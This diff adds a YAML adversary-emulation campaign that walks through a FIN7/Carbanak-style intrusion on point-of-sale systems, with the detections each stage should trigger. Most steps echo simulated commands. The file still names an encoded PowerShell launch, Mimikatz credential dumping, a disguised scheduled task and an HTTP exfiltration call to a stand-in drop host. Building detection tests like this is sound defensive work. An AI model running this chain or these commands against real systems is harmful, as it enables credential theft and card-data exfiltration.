@@ -1,0 +1,203 @@
+api_version: v1
+kind: Campaign
+
+meta:
+  name: fin7-carbanak
+  adversary: FIN7
+  description: "FIN7/Carbanak financially-motivated intrusion targeting point-of-sale and financial systems. Uses spearphishing, PowerShell-based tooling, credential harvesting, and data exfiltration for payment card theft."
+  objective: "Simulate FIN7 kill chain from initial spearphishing through POS data exfiltration. Validate detection coverage across financial threat scenarios."
+  mitre_version: "15.1"
+  severity: critical
+  tags: [fin7, carbanak, financial, pos, spearphishing]
+  authors: ["ThreatEcho"]
+  created: "2026-09-14"
+  modified: "2026-09-14"
+  references:
+    - "https://attack.mitre.org/groups/G0046/"
+    - "https://www.mandiant.com/resources/blog/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation"
+    - "https://center-for-threat-informed-defense.github.io/adversary_emulation_library/fin7/"
+
+variables:
+  target_domain: "corp.example.com"
+  c2_server: "10.0.0.80"
+  c2_port: "443"
+  pos_subnet: "10.10.20.0/24"
+  exfil_endpoint: "https://drop.example.com/upload"
+
+stages:
+  - id: spearphish-doc
+    name: Spearphishing with Malicious Document
+    technique: T1566.001
+    tactic: initial-access
+    description: "FIN7 delivers weaponized Word document with embedded VBA macro via targeted spearphishing email."
+    platforms: [windows]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] Delivering .docx with VBA macro to finance@{{target_domain}}"'
+        - 'echo "[SIM] Macro executes on document open"'
+    expect:
+      telemetry: [file_create, process_create, email_delivered]
+      detections: [spearphish_attachment_detected, macro_execution_detected]
+    on_success: powershell-payload
+    on_failure: abort
+
+  - id: powershell-payload
+    name: PowerShell Payload Execution
+    technique: T1059.001
+    tactic: execution
+    description: "VBA macro launches obfuscated PowerShell payload. FIN7 heavily uses PowerShell for staging and C2 communication."
+    platforms: [windows]
+    depends_on: [spearphish-doc]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] powershell.exe -enc <base64_payload>"'
+        - 'echo "[SIM] HALFBAKED backdoor staged in memory"'
+    expect:
+      telemetry: [process_create, script_execution, network_connection]
+      detections: [powershell_encoded_command, suspicious_child_process_winword]
+    on_success: c2-establish
+    on_failure: abort
+
+  - id: c2-establish
+    name: HTTPS C2 Channel
+    technique: T1071.001
+    tactic: command-and-control
+    description: "HALFBAKED backdoor establishes HTTPS C2 channel. FIN7 uses legitimate-looking domains and TLS for C2 traffic."
+    platforms: [windows]
+    depends_on: [powershell-payload]
+    execute:
+      type: http
+      target: "https://{{c2_server}}:{{c2_port}}/api/v1/checkin"
+    expect:
+      telemetry: [network_connection, dns_query, tls_handshake]
+      detections: [c2_https_beacon, suspicious_tls_certificate]
+    on_success: recon-internal
+    on_failure: abort
+
+  - id: recon-internal
+    name: Internal Network Reconnaissance
+    technique: T1018
+    tactic: discovery
+    description: "FIN7 enumerates internal hosts to identify POS terminals, domain controllers, and financial application servers."
+    platforms: [windows]
+    depends_on: [c2-establish]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] net view /domain:{{target_domain}}"'
+        - 'echo "[SIM] Scanning {{pos_subnet}} for POS terminals"'
+        - 'echo "[SIM] nltest /dclist:{{target_domain}}"'
+    expect:
+      telemetry: [process_create, network_connection]
+      detections: [internal_network_scan, remote_system_discovery]
+    on_success: credential-harvest
+    on_failure: continue
+
+  - id: credential-harvest
+    name: Credential Harvesting via Mimikatz
+    technique: T1003.001
+    tactic: credential-access
+    description: "FIN7 uses Mimikatz or custom tools to dump credentials from LSASS for lateral movement to POS systems."
+    platforms: [windows]
+    depends_on: [recon-internal]
+    execute:
+      type: shell
+      elevated: true
+      commands:
+        - 'echo "[SIM] sekurlsa::logonpasswords"'
+        - 'echo "[SIM] Harvesting domain admin credentials"'
+    expect:
+      telemetry: [process_create, process_access, file_create]
+      detections: [lsass_access_detected, mimikatz_signature, credential_dump_attempt]
+    on_success: lateral-pos
+    on_failure: abort
+
+  - id: lateral-pos
+    name: Lateral Movement to POS Systems
+    technique: T1021.001
+    tactic: lateral-movement
+    description: "FIN7 moves laterally to POS terminals using harvested credentials via RDP. Targets systems processing payment card data."
+    platforms: [windows]
+    depends_on: [credential-harvest]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] mstsc /v:pos-terminal-01.{{target_domain}}"'
+        - 'echo "[SIM] Authenticating with harvested domain admin credentials"'
+    expect:
+      telemetry: [network_connection, logon_event, process_create]
+      detections: [rdp_lateral_movement, unusual_rdp_source, admin_logon_pos_system]
+    on_success: pos-scraper
+    on_failure: abort
+
+  - id: pos-scraper
+    name: POS Memory Scraping
+    technique: T1005
+    tactic: collection
+    description: "FIN7 deploys memory-scraping malware on POS terminals to capture payment card track data from process memory."
+    platforms: [windows]
+    depends_on: [lateral-pos]
+    execute:
+      type: shell
+      elevated: true
+      commands:
+        - 'echo "[SIM] Injecting POS scraper into payment application process"'
+        - 'echo "[SIM] Capturing Track 1/Track 2 card data from memory"'
+    expect:
+      telemetry: [process_create, process_access, file_create]
+      detections: [memory_scraping_detected, pos_malware_signature, suspicious_process_injection]
+    on_success: data-stage
+    on_failure: abort
+
+  - id: data-stage
+    name: Data Staging
+    technique: T1074.001
+    tactic: collection
+    description: "FIN7 stages stolen card data locally before exfiltration. Data is compressed and encrypted."
+    platforms: [windows]
+    depends_on: [pos-scraper]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] Compressing card data to C:\\Users\\Public\\tmp.zip"'
+        - 'echo "[SIM] Encrypting staged data with AES-256"'
+    expect:
+      telemetry: [file_create, file_modify]
+      detections: [data_staging_detected, suspicious_archive_creation]
+    on_success: persist-scheduled-task
+    on_failure: continue
+
+  - id: persist-scheduled-task
+    name: Persistence via Scheduled Task
+    technique: T1053.005
+    tactic: persistence
+    description: "FIN7 creates scheduled tasks for persistence. Ensures continued access to compromised POS environment."
+    platforms: [windows]
+    depends_on: [c2-establish]
+    execute:
+      type: shell
+      elevated: true
+      commands:
+        - 'echo "[SIM] schtasks /create /tn \"WindowsUpdate\" /tr \"powershell.exe -enc <payload>\" /sc daily /st 02:00"'
+    expect:
+      telemetry: [process_create, scheduled_task_create]
+      detections: [malicious_scheduled_task, persistence_mechanism_created]
+    on_success: exfiltrate
+    on_failure: continue
+
+  - id: exfiltrate
+    name: Data Exfiltration over HTTPS
+    technique: T1041
+    tactic: exfiltration
+    description: "FIN7 exfiltrates stolen payment card data over the existing C2 channel. Data is sent in encrypted chunks."
+    platforms: [windows]
+    depends_on: [data-stage, persist-scheduled-task]
+    execute:
+      type: http
+      target: "{{exfil_endpoint}}"
+    expect:
+      telemetry: [network_connection, file_read]
+      detections: [data_exfiltration_detected, large_outbound_transfer, encrypted_exfil_channel]
+    on_failure: abort
